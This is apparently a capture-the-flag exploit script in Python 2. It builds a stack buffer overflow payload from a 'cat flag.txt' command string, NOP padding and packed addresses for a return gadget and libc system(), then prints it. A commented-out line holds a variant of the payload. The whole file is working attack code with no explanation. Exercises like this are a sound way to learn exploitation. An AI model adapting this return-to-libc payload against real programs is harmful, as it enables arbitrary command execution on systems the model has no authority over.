import struct

system_addr =  0x7ffff7a72490

ret_addr = 0x4006d1

padding_len = 1032

addr = 0x7fffffffd9c0

string = "cat flag.txt"

#print len(string)

string2 = "\x00"

payload =   string + string2 + "\x90" * (padding_len - 13)  +  struct.pack("<Q", ret_addr) + struct.pack("<Q", addr) + struct.pack("<Q", system_addr)

#payload = payload = "\x90" * 1032 + struct.pack('<Q', ret_addr) + struct.pack('<Q', 0x4006d3) +'cat flag.txt'+'\x00'*4+ struct.pack('<Q',0x4006d0) + struct.pack('<Q',system_addr)     

print payload

